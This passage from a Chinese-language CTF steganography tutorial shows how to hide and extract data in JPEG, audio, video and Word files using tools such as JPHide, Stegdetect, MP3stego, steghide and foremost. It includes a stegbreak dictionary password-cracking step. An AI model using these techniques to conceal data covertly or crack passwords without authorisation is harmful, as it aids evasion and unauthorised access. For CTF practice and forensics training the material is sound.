0），JPEG文件交换格式的JPEG图片开始前2个字节是图像开始标记为0xFFD8，之后2个字节接着便是应用程序保留标记为0xFFE0，应用程序保留标记APP0包含9个具体字段，这里介绍前三个字段，第一个字段是数据长度占2个字节，表示包括本字段但不包括标记代码的总长度，这里为10个字节，第二个字段是标识符占5个字节0x4A46494600表示“JFIF0”字符串，第三个字段是版本号占2个字节，这里是0X0101，表示JFIF的版本号为1.1，但也可能为其它数值，从而代表了其它版本号。</p><p>分别准备一个JPEG格式的图片（111.jpg）和一个文本文件（flag.txt）。</p><p>由于JPEG文件使用的数据存储方式有多种不能一一演示，这里用最常用的JPEG格式-JPEG文件交换格式（JPEG File Interchange Format，JFIF）作为示例。</p><p>由于JPEG文件使用的数据存储方式有多种不能一一演示，这里用最常用的JPEG格式-JPEG文件交换格式（JPEG File Interchange Format，JFIF）作为示例。</p><p>JPEG是一种压缩标准，有很多种采用不同文件交换格式的JPG图片。</p><p>这里简单介绍JPEG文件交换格式的JPEG图片的图像开始标记SOI（Start of Image）和应用程序保留标记APP0（Application 0）</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/12/kHMz9CrNKIw4TQ7.png" alt="image-20200612192533248"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FF D8</span><br><span class="line">&#x2F;&#x2F;JPEG文件交换格式的JPEG图片开始前2个字节是图像开始标记 FF D8</span><br><span class="line">FF E0 </span><br><span class="line">&#x2F;&#x2F;之后2个字节是应用程序保留标记 FF E0</span><br><span class="line">00 10</span><br><span class="line">&#x2F;&#x2F;应用程序保留标记APP0包含9个具体字段，这里介绍前三个字段，第一个字段是数据长度占2个字节 00 10,表示包括本字段但不包括标记代码的总长度</span><br><span class="line">4A 46 49 46 00</span><br><span class="line">&#x2F;&#x2F;第二个字段是标识符占5个字节0x4A46494600表示“JFIF0”字符串</span><br><span class="line">01 01</span><br><span class="line">&#x2F;&#x2F;第三个字段是版本号占2个字节，这里是01 01,表示JFIF的版本号为1.1,但也可能为其它数值，从而代表了其它版本号。</span><br></pre></td></tr></table></figure><p>1、Windows版本可以使用具有图形化操作界面的Jphswin，选择“Open jpeg”打开示例JPEG格式图片111.jpg</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/12/m7lZu4LbnGwiIyh.png" alt="image-20200612192920524"></p><p>如果你选择的不是JPEG格式的图片程序会自动退出，你可以16进制编辑器如Winhex查看图片的图像开始标记SOI和应用程序保留标记APP0，当载入JPEG格式图片会显示一些图片的属性。</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/12/WOxzBF587jDyETb.png" alt="image-20200612192943561"></p><p>2、选择“Hide”选项之后在两次文本框输入相同的密码，这里以输入flag作为密码为例，然后输入要包含隐藏信息的文本。</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/12/q2N3cvbLlBWPXSC.png" alt="image-20200612193040489"></p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/12/2M61E7UwXqFeyza.png" alt="image-20200612193059255"></p><p>3、选择“Save jpeg as”选项将图片另存为jpeg格式并输入文件的名称为新的图像文件如123.jpg</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/12/ZsJfSWBc6DjxXRK.png" alt="image-20200612193157903"></p><p>4.之后便可以看到生成结果和相关信息，JPhide隐写生成过程就完成了</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/12/lgq4HpYXxynvw35.png" alt="image-20200612193225396"></p><p><strong>解法：</strong></p><p>当我们拿到一道JPG图片隐写的题时，可以先用Stegdetect检测是以哪种隐写方式加密的。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Stegdetect的主要选项如下：</span><br><span class="line"></span><br><span class="line">-q 仅显示可能包含隐藏内容的图像。 </span><br><span class="line"></span><br><span class="line">-n 启用检查JPEG文件头功能，以降低误报率。如果启用，所有带有批注区域的文件将被视为没有被嵌入信息。如果JPEG文件的JFIF标识符中的版本号不是1.1，则禁用OutGuess检测。 </span><br><span class="line"></span><br><span class="line">-s 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。</span><br><span class="line"></span><br><span class="line">-d 打印带行号的调试信息。 </span><br><span class="line"></span><br><span class="line">-t 设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下： </span><br><span class="line">j 检测图像中的信息是否是用jsteg嵌入的。 </span><br><span class="line">o 检测图像中的信息是否是用outguess嵌入的。 </span><br><span class="line">p 检测图像中的信息是否是用jphide嵌入的。 </span><br><span class="line">i 检测图像中的信息是否是用invisible secrets嵌入的。 </span><br><span class="line">-V 显示软件版本号。</span><br></pre></td></tr></table></figure><p>1.将图片复制到stegdetect.exe所在目录下，右键PowerShell命令<code>stegdetect.exe -tjopi -s 10.0 hide.jpg</code>检测该图片用的是哪种加密方式</p><p>2.然而我们并不知道密码是啥，这时可以用stegdetect下的stegbreak字典破解，同样图片和stegbreak.exe在同一目录下，命令<code>stegbreak.exe -r rules.ini -f password.txt -r p hide.jpg</code>破解密码</p><p>3.使用jphide下的工具JPHS从hide.jpg图片提取出隐藏信息</p><p><strong>实验：</strong></p><p>首先，在cmd/powershell中运行<code>Stegdetect</code>，对目标图片进行检测</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200613125042445.png" alt="image-20200613125042445"></p><p>发现结果显示是jphide隐写的可能性很大。<br><strong>接着，我们使用工具JPHS提取信息</strong></p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/13/JeDPrQ3MKizxBN1.png" alt="image-20200613125242778"></p><p>然后打开保存的txt文件，即得flag</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/13/hC1VbJczpwg6T93.png" alt="image-20200613125410159"></p><p>得到flag</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/13/8kDlNi4aZ5WI7y3.png" alt="image-20200613125859949"></p><h5 id="B-JSteg隐写—jpg隐写"><a href="#B-JSteg隐写—jpg隐写" class="headerlink" title="B.JSteg隐写—jpg隐写"></a>B.JSteg隐写—jpg隐写</h5><p>隐写工具：jsteg</p><p>先用Stegdetect检测加密类型</p><p>再用jsteg解密</p><p>隐写写入：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jsteg-windows-amd64.exe hide 123.jpg flag.txt out.jpg</span><br></pre></td></tr></table></figure><p>解密隐写：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jsteg-windows-amd64.exe reveal out.jpg out.txt</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/13/bcx4o3Cw1yiFJzY.png" alt="image-20200613133121279"></p><h5 id="C-Outguess隐写—jpg隐写"><a href="#C-Outguess隐写—jpg隐写" class="headerlink" title="C.Outguess隐写—jpg隐写"></a>C.Outguess隐写—jpg隐写</h5><p>工具：Outguess工具</p><p><strong>解题步骤：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 双击打开图片，我们先确认一下图片内容并没有什么异常</span><br><span class="line">- 使用Stegdetect对图片的隐写方式进行检测</span><br><span class="line">- 从结果中得知是使用JPHide的隐写，使用JPHS工具对隐写信息进行提取</span><br><span class="line">- 最后打开保存的文件</span><br></pre></td></tr></table></figure><p><strong>第一步，在cmd中运行，Stegdetect，对目标图片进行检测</strong></p><p><strong>第二步，使用Outguess工具提取隐写信息</strong></p><p>点击Enter key功能，输入密码<br>点击Load image 加载目标图片<br>点击Extract file功能，将提取出来的信息保存成flag.txt文件。</p><p>打开flag.txt文件得到flag</p><p><strong>思考</strong></p><ol><li>尝试其他DCT域隐写，如F5</li><li>自己尝试使用JPHS的Hide功能，实现一个隐写。</li></ol><hr><h4 id="五、数字水印的隐写"><a href="#五、数字水印的隐写" class="headerlink" title="五、数字水印的隐写"></a>五、数字水印的隐写</h4><h5 id="背景知识-3"><a href="#背景知识-3" class="headerlink" title="背景知识"></a>背景知识</h5><p><strong>数字水印</strong><br>数字水印技术，是指在数字化的数据内容中嵌入不明显的记号。<br>特征是，被嵌入的记号通常是不可见或不可察的，但是可以通过计算操作检测或者提取。</p><p>盲水印，是指人感知不到的水印，包括看不到或听不见（没错，数字盲水印也能够用于音频）。其主要应用于音像作品、数字图书等，目的是，在不破坏原始作品的情况下，实现版权的防护与追踪。</p><p>添加数字盲水印的方法简单可分为<font color=red>空域方法</font>和<font color=red>频域方法</font>，这两种方法添加了冗余信息，但在编码和压缩情况不变的情况下，不会使原始图像大小产生变化（原来是10MB添加盲水印之后还是10MB）。</p><p>空域是指空间域，我们日常所见的图像就是空域。空域添加数字水印的方法是在空间域直接对图像操作（之所以说的这么绕，是因为不仅仅原图是空域，原图的差分等等也是空域），比如将水印直接叠加在图像上。</p><p>相对于空域方法，<font color=red>频域加盲水印</font>的方法隐匿性更强，抵抗攻击能力更强。这类算法解水印困难，你不知道水印加在那个频段，而且受到攻击往往会破坏图像原本内容</p><p>我们常说一个音有多高，这个音高是指频率；同样，图像灰度变化强烈的情况，也可以视为图像的频率。频域添加数字水印的方法，是指通过某种变换手段（傅里叶变换，离散余弦变换，小波变换等）将图像变换到频域（小波域），在频域对图像添加水印，再通过逆变换，将图像转换为空间域。相对于空域手段，频域手段隐匿性更强，抗攻击性更高。</p><p>所谓对水印的攻击，是指破坏水印，包括涂抹，剪切，放缩，旋转，压缩，加噪，滤波等。数字盲水印不仅仅要敏捷性高（不被人抓到），也要防御性强（抗打）。就像Dota的敏捷英雄往往是脆皮，数字盲水印的隐匿性和鲁棒性是互斥的。（鲁棒性是抗攻击性的学术名字）</p><h5 id="常用工具：-3"><a href="#常用工具：-3" class="headerlink" title="常用工具："></a>常用工具：</h5><p>BlindWaterMark</p><p>工具github地址：<a href="https://github.com/chishaxie/BlindWaterMark" target="_blank" rel="noopener">https://github.com/chishaxie/BlindWaterMark</a></p><p><strong>解法：</strong></p><p>盲水印一般会有两张图，一张图是原图，一张为添加了水印的</p><p>使用BlindWaterMark工具提取</p><p>合成盲水印图</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python bwm.py encode hui.png wm.png hui_with_wm.png</span><br></pre></td></tr></table></figure><p>提取图中的盲水印 (需要原图)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python bwm.py decode hui.png hui_with_wm.png wm_from_hui.png</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/13/8lSaKOjw4FDZpBY.png" alt="image-20200613151739239"></p><p>有想要深入了解的同学可以去看这篇文章：</p><p><a href="https://stgod.com/1482/" target="_blank" rel="noopener">https://stgod.com/1482/</a></p><p><strong>思考</strong></p><ol><li>请查阅关于空域盲水印的资料</li><li>试着对频域盲水印攻击，如截屏、倒转等操作，再进行提取水印，看看水印是否被破坏。</li></ol><hr><h4 id="六、图片容差的隐写"><a href="#六、图片容差的隐写" class="headerlink" title="六、图片容差的隐写"></a>六、图片容差的隐写</h4><h5 id="背景知识-4"><a href="#背景知识-4" class="headerlink" title="背景知识"></a>背景知识</h5><p><strong>容差</strong><br>容差，在选取颜色时所设置的选取范围，容差越大，选取的范围也越大，其数值是在0-255之间。</p><h5 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h5><p><strong>beyond compare</strong></p><p>beyond compare是一款很适合用来对图片进行比较的工具，就图片而言，它支持容差、范围、混合等模式。</p><p><strong>容差比较的隐写</strong></p><p>没有找到题所以就介绍一下解法</p><p><strong>解法：</strong></p><p>打开工具，选择图片比较，导入两张图片</p><p>选择容差大小，进行比较得到flag</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/13/mJTRLNEApdvIwYb.png" alt="image-20200613153005517"></p><p><strong>提示：</strong></p><p>如果在CTF赛场中，就隐写这一部分，出题人给于两张或者多张图片，一般都是需要对图片的内容进行比较的</p><hr><h3 id="多媒体文件隐写"><a href="#多媒体文件隐写" class="headerlink" title="多媒体文件隐写"></a>多媒体文件隐写</h3><p>音频、视频等多媒体也是我们生活经常看到的文件格式。我们上网听音乐，看视频，都离不开多媒体，一方面多媒体文件一般比单独的图片文件大，这是否也意味着能存储更多的信息，也可以隐藏更多的信息呢？</p><p>多媒体文件隐写分为：</p><ul><li>音频隐写</li><li>视频隐写</li></ul><hr><h4 id="一、音频隐写"><a href="#一、音频隐写" class="headerlink" title="一、音频隐写"></a>一、音频隐写</h4><p>音频隐写大致分为两大类：</p><ul><li>音轨插入摩尔斯电码</li><li>MP3stego隐写</li></ul><h4 id="常用工具：-4"><a href="#常用工具：-4" class="headerlink" title="常用工具："></a>常用工具：</h4><ul><li>Audacity</li><li>MP3stego</li></ul><h5 id="A-摩尔斯电码音频隐写"><a href="#A-摩尔斯电码音频隐写" class="headerlink" title="A.摩尔斯电码音频隐写"></a>A.摩尔斯电码音频隐写</h5><p><strong>背景知识</strong></p><p>摩尔斯电码（又译为摩斯密码，Morse code）是一种时通时断的信号代码，通过不同的排列顺序来表达不同的英文字母、数字和标点符号。在过去它以电报的形式来发送消息，如今当听到这样的电报你还能解出的他它的明文吗？</p><p><strong>摩尔斯电码对照表</strong></p><p><img src= "/img/loading.gif" data-src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/%E5%9B%BD%E9%99%85%E6%91%A9%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81.svg/315px-%E5%9B%BD%E9%99%85%E6%91%A9%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81.svg.png" alt="摩尔斯电码- 维基百科，自由的百科全书"></p><p><strong>实验：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 在实验机中找到隐写术目录，打多媒体隐写，进一步找到文件夹音频隐写的目录下找到莫尔斯电码.mp3 文件</span><br><span class="line">- 我们可以先双击点开，尝试听一下内容，我们会听到在影视中常常听见的电报的发文声</span><br><span class="line">- 由于，单靠听我们很难直接辨别出长短，毕竟我们不是专业的，我们可以尝试用Audacity打开文件</span><br><span class="line">- 短代表点，长代表横，对照电码表，翻译出flag</span><br><span class="line">- 翻译摩尔斯电码可以使用在线翻译网站</span><br></pre></td></tr></table></figure><p><strong>当我们确认是摩尔斯电报之后，我先用Audacity打开目标文件，并观察波形</strong></p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200614093414910.png" alt="image-20200614093414910"></p><p><strong>以长的代表代表横线，短的代表点，大的间隔是空格，抄写下摩尔斯电码</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.. -.-. .... ..- -. --.- .. ..- -- --- .-. ... . - . ... -</span><br></pre></td></tr></table></figure><p>翻译得：</p><p>ICHUNQIUMORSETEST</p><p><strong>思考与实践</strong></p><ol><li>利用lakey这个软件给制作一个自己ID的摩尔斯电文吧。</li></ol><h5 id="B-MP3stego工具隐写"><a href="#B-MP3stego工具隐写" class="headerlink" title="B.MP3stego工具隐写"></a>B.MP3stego工具隐写</h5><p><strong>MP3stego介绍</strong></p><p>MP3stego是著名的音频数据隐写工具，支持常见的压缩音频文件格式如mp3的数据嵌入，它采用的是一种特殊的量化方法，并且将数据隐藏在MP3文件的奇偶校验块中。</p><p><strong>使用方法</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用MP3Stego进行加密解密：</span><br><span class="line">加密：encode -E 加密文本 -P 密码  wav文件 mp3文件</span><br><span class="line">解密：decode -X -P  密码  mp3文件</span><br></pre></td></tr></table></figure><p><strong>实验：</strong></p><p>小明想和小红告白，在一个首歌中藏了一个txt文件，可是小红却不知道怎么找到mp3文件中的隐藏信息，你能帮帮她吗？ hit： password： love</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 在实验机中找到隐写术目录，打多媒体隐写，进一步找到文件夹音频隐写的目录下找到love.mp3 文件</span><br><span class="line">- 我们可以先双击点开，尝试听一下内容，感觉是一个很正常的音乐</span><br><span class="line">- 因为有个提示，这里我们用到了密码加密，我们可以猜测是否是用mp3stego进行的隐写呢？</span><br><span class="line">- 在工具文件中找到mp3stego，将目标文件拷贝到工具的目录下</span><br><span class="line">- 尝试提取隐藏信息，最后的flag是flag&#123;I_love_you&#125;</span><br></pre></td></tr></table></figure><p><strong>首先先将目标文件复制到MP3stego这个工具的目录下</strong></p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/14/YcXyOzFIotKpkjU.png" alt="image-20200614100259368"></p><p><strong>在CMD下使用Decode.exe程序进行提取</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Decode.exe -X -P love love.mp3</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200614100932009.png" alt="image-20200614100932009"></p><p>最后打开目录下的love.mp3.txt文件就能看到隐写内容了</p><p><strong>思考与实践</strong></p><ol><li>最后小明表白成功了，你是否也可以尝试去做一个MP3隐写呢</li></ol><h5 id="C-频谱图音频隐写"><a href="#C-频谱图音频隐写" class="headerlink" title="C.频谱图音频隐写"></a>C.频谱图音频隐写</h5><p><strong>背景知识</strong></p><p>频谱是频率谱密度的简称，是频率的分布曲线。复杂振荡分解为振幅不同和频率不同的谐振荡，这些谐振荡的幅值按频率排列的图形叫做频谱。<br>在CTF中，我们可以单独只对一个声道中，隐写进信息</p><p><strong>实验</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 在实验机中找到隐写术目录，打多媒体隐写，进一步找到文件夹音频隐写的目录下找到这有点刺耳.wav的文件</span><br><span class="line">- 我们可以先双击点开，尝试听一下内容，感觉是一个很正常的音乐</span><br><span class="line">- 因为这次是针对频谱的，我们直接用Adobe Aud ton打开目标文件</span><br><span class="line">- 调整到频谱视图，调整大小，直到能清晰的看到隐写内容</span><br><span class="line">- 尝试提取隐藏信息，最后的flag是flag&#123;CTF_i5_rea1ly_funny!&#125;</span><br></pre></td></tr></table></figure><p><strong>直接进入正题吧</strong><br>使用AU打开目标文件</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200614103023624.png" alt="image-20200614103023624"></p><p>调整到频谱图，并调整频谱图大小，直到能看清flag</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200614104328986.png" alt="image-20200614104328986"></p><h5 id="D-波形音频隐写"><a href="#D-波形音频隐写" class="headerlink" title="D.波形音频隐写"></a>D.波形音频隐写</h5><p><strong>背景知识</strong></p><p>通常来说，波形方向的题，在观察到异常后，使用相关软件（Audacity, Adobe Audition 等）观察波形规律，将波形进一步转化为 01 字符串等，从而提取转化出最终的 flag。</p><p><strong>实验:</strong></p><p>ISCC-2017：杂项—-普通的DISCO我们普通的摇<del>~</del></p><p>（1）下载一个Disco.wav音频文件，不是以.mp3结尾。那么mp3stego这个工具是无法使用了。</p><p>（2）细心的童鞋会注意到，音频开头有一段杂音。然后用音频分析软件打开，这里我用audacity这款工具打开音频文件。如下图所示：</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/16/MFRdSpUiTo2cDBl.png" alt="image-20200616195625454"></p><p>这道题就是考个细心程度，当得到这个波形之后就很容易联想到二进制数据，这道题的话因为上下两个音轨是一样的，所以取上面这个，这里可以认为上面一小点是1，下面一小点是0，如下图：</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200616201440356.png" alt="image-20200616201440356"></p><p>就能得到：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">110011011011001100001110011111110111010111011000010101110101010110011011101011101110110111011110011111101</span><br></pre></td></tr></table></figure><p>然后得到之后首先观察数据，因为很短，所以推测不是文件，应该是处理字符编码得到flag。</p><p>首先这里一共是105位</p><p>不符合8位一个字符，符合7位，于是在每个7位之前加个0，得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">01100110,01101100,01100001,01100111,01111011,01010111,00110000</span><br><span class="line">01010111,00101010,01100110,01110101,01101110,01101110,01111001,</span><br><span class="line">01111101</span><br></pre></td></tr></table></figure><p>最后二进制转十进制，转ASCII得到：flag{W0W*funny}</p><p>好吧，这边编码的确恶心人。</p><h5 id="E-LSB音频隐写"><a href="#E-LSB音频隐写" class="headerlink" title="E.LSB音频隐写"></a>E.LSB音频隐写</h5><p><strong>背景知识</strong></p><p>类似于图片隐写中的 LSB 隐写，音频中也有对应的 LSB 隐写。主要可以使用Silenteye工具，其介绍如下：</p><p>SilentEye是一种跨平台应用程序设计，可轻松使用隐写术，在这种情况下，将消息隐藏为图片或声音。它提供了一个非常漂亮的界面，并通过使用插件系统轻松集成了新的密写算法和加密过程。</p><p><strong>实验：</strong></p><p>2015 广东省强网杯 - Little Apple</p><p>直接使用 <code>slienteye</code> 即可。</p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200616203211716.png" alt="image-20200616203211716"></p><p>这道原题找不到了，但是这主要就是考的知识面，知道这个工具才能做出来</p><p><strong>思考与实践</strong></p><p>如何做一个音频隐写？</p><hr><h4 id="二、视频隐写"><a href="#二、视频隐写" class="headerlink" title="二、视频隐写"></a>二、视频隐写</h4><h5 id="A-基于文件结构的隐写"><a href="#A-基于文件结构的隐写" class="headerlink" title="A.基于文件结构的隐写"></a>A.基于文件结构的隐写</h5><p>目前在CTF赛事中较为常出现的视频隐写，一般都是将一场带有隐写信息的图片，嵌入视频中，我们所需要做的就是将这个图片从视频分离出来，然后在分析我们分离出来的文件是什么，之后的操作可能会涉及到密码编码，图片隐写等知识点。</p><p>另一方面，我们分离文件，如果单独对视频来说ffmpeg是一个很好的工具，这里我使用的是foremost ，一款linux下的命令行工具，当然我们也可以使用binwalk或者dd等工具，正如我们图片隐写中教大家分离图片所用的方法一样。<br>区别是，ffmpeg将视频分解成一张一张的图片，foremost是一个基于文件头和尾部信息以及文件的内建数据结构恢复文件的命令行工具。</p><p><strong>实验：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 在实验机中找到隐写术目录，打多媒体隐写，进一步找到文件夹视频隐写的目录下找到powpow.mp4的文件</span><br><span class="line">- 我们可以先双击点开，观看下这个视频文件</span><br><span class="line">- 分离图片，得到一张图片，对图片分析，由提示可知是steghide的图片隐写</span><br><span class="line">- 之后的操作我们就不复述了, 看一下操作。</span><br><span class="line">- flag&#123;We are fsociety, we are finally free, we are finally awake!&#125;</span><br></pre></td></tr></table></figure><p><strong>首先用foremost分离图片</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foremost powpow.mp4</span><br></pre></td></tr></table></figure><p><strong>在output目录下找到分离出来的图片</strong></p><p><img src= "/img/loading.gif" data-src="C:%5CUsers%5Cyiming%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200614104703882.png" alt="image-20200614104703882"></p><p>使用命令 <code>steghide extract -sf thing.jpg -p password</code>提取图片隐写内容内容</p><p><strong>对提取出来的隐写内容进行解码</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat base64.txt</span><br><span class="line">python3</span><br><span class="line">&gt;&gt;&gt; import base64</span><br><span class="line">&gt;&gt;&gt; base64.b85decode(b&#39;W^7?+dsk&amp;3VRB_4W^-?2X&#x3D;QYIEFgDfAYpQ4AZBT9VQg%9AZBu9Wh@|fWgua4Wgup0ZeeU&#125;c_3kTVQXa&#125;eE&#39;)</span><br><span class="line">b&#39;flag&#123;We are fsociety, we are finally free, we are finally awake!&#125;&#39;</span><br></pre></td></tr></table></figure><p>最终的flag是<br>**完整操作命令flag{We are fsociety, we are finally free, we are finally awake!}</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foremost powpow.mp4</span><br><span class="line">stepic -i output&#x2F;png&#x2F;00001069.png -d &gt; thing</span><br><span class="line">steghide extract -sf thing.jpg -p password</span><br><span class="line">cat base64.txt</span><br><span class="line">python3</span><br><span class="line">&gt;&gt;&gt; import base64</span><br><span class="line">&gt;&gt;&gt; base64.b85decode(b&#39;W^7?+dsk&amp;3VRB_4W^-?2X&#x3D;QYIEFgDfAYpQ4AZBT9VQg%9AZBu9Wh@|fWgua4Wgup0ZeeU&#125;c_3kTVQXa&#125;eE&#39;)</span><br><span class="line">b&#39;flag&#123;We are fsociety, we are finally free, we are finally awake!&#125;&#39;</span><br></pre></td></tr></table></figure><h5 id="B-MSU-Stego隐写"><a href="#B-MSU-Stego隐写" class="headerlink" title="B.MSU Stego隐写"></a>B.MSU Stego隐写</h5><p>MSU StegoVideo 数据隐写</p><p>这个隐写也是考了知识面吧，题目较少</p><p><strong>解法：</strong></p><p>选中”Extract file from video”:</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/17/IN3oXFRn2YbCqLg.png" alt="image-20200617160830674"></p><p>选择带有隐藏信息的文件和一个空白的用于保存提取出来的信息的 .txt 文件：</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/17/cHfvkLS24CjPXr1.png" alt="image-20200617162437195"></p><p>输入密码：(这个密码是在生成的时候设置的，考题可能会在其他地方会有提示)</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/17/kOxgqWjHCso7r14.png" alt="image-20200617162556361"></p><p>正在进行信息提取操作：</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/17/vaMYhK3obJs62CU.png" alt="image-20200617162609599"></p><p>操作完成后，就会得到隐藏的信息。</p><p>隐藏的步骤可以自己去尝试</p><h5 id="C-TCStego隐写"><a href="#C-TCStego隐写" class="headerlink" title="C.TCStego隐写"></a>C.TCStego隐写</h5><p>和MSU Stego一样，主要是考了知识面</p><h3 id="电子文档隐写"><a href="#电子文档隐写" class="headerlink" title="电子文档隐写"></a>电子文档隐写</h3><p>电子文档，它主要包括电子文书、电子信件、电子报表、电子图纸、纸质文本文档的电子版本等等，是人们电脑办公中必不可少的文件。</p><h4 id="一、word隐写"><a href="#一、word隐写" class="headerlink" title="一、word隐写"></a>一、word隐写</h4><p>微软的Word一直是文字处理软件中的佼佼者。微软的Word、Excel、PowerPoint提供了许多在文档中隐藏数据的方法，包括批注、个人信息、水印、不可见内容、隐藏文字和定制的XML数据。最简单，也是最奇妙的，也就是这里将提到的隐藏文本功能。</p><h5 id="利用隐藏文本功能进行隐写"><a href="#利用隐藏文本功能进行隐写" class="headerlink" title="利用隐藏文本功能进行隐写"></a>利用隐藏文本功能进行隐写</h5><p><strong>实验：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 在实验机中找到隐写术目录，打开电子文档隐写，打开flag.doc</span><br><span class="line">- 在菜单栏中选择，并单击File（文件）-&gt;Tool（工具）-&gt;Option（选项） </span><br><span class="line">- 找到 隐藏文字 功能，选择这个功能，点击保存</span><br><span class="line">- 最终flag&#123;doc_stego_is_ez&#125;</span><br></pre></td></tr></table></figure><p><strong>首先打开，flag.doc</strong><br>打开flag.doc，能看到的文字内容只有<code>Flag in here。</code>,我们就可以猜测，flag是被隐藏起来了</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/14/JLdmzNC1kVhTW97.png" alt="image-20200614105634162"></p><p><strong>开启隐藏文字显示功能，查看flag是否被隐写</strong><br>在文件栏中，找到选项，打开显示，隐藏文字选项</p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/14/YFlaW2tqB4vpiMK.png" alt="image-20200614105617350"></p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/14/wgpCzhIvT48irD2.png" alt="image-20200614105314028"></p><p><strong>思考</strong></p><ol><li>尝试将文本中的 Flag in here。 也隐藏掉。</li><li>尝试使用word自带的文档检查器检查是否又文字隐藏</li></ol><h5 id="word文档的xml转换"><a href="#word文档的xml转换" class="headerlink" title="word文档的xml转换"></a>word文档的xml转换</h5><p>我们可以将word文档转换成xml格式，当然反过来我们也可以将xml转换成word文档，这导致了我们如果重新打包为word文档的过程中，有可能被隐藏进其他数据。</p><p><strong>实验：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- 在实验机中找到隐写术目录，打开电子文档隐写，打开file.docx</span><br><span class="line">- 看到的内容是 This is not the flag you&#39;re looking for.</span><br><span class="line">- 我们可以尝试分离word文档</span><br><span class="line">- 发现，其中包含了一个flag.txt的文件，我们可以直接用7Z，使用zip的方法重新打开file.doc</span><br><span class="line">- 打开flag.txt，最终flag&#123;this_would_be_the_flag_you_are_looking_for&#125;</span><br></pre></td></tr></table></figure><p><strong>首先，找到文件并打开文件查看</strong></p><p><img src= "/img/loading.gif" data-src="https://i.loli.net/2020/06/14/S8rMghJPwGN5LQX.png" alt="image-20200614105905294"></p><p><strong>尝试分离文件内容</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+bash-4.3$ file file.docx </span><br><span class="line">file.docx: Zip archive data, at least v2.0 to extract</span><br><span class="line">+bash-4.3$ 7z x file.docx -oout</span><br><span class="line"></span><br><span class="line">7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18</span><br><span class="line">p7zip Version 9.20 (locale&#x3D;utf8,Utf16&#x3D;on,HugeFiles&#x3D;on,8 CPUs)</span><br><span class="line"></span><br><span class="line">Processing archive: file.docx</span><br><span class="line"></span><br><span class="line">Extracting  word&#x2F;numbering.xml</span><br><span class="line">Extracting  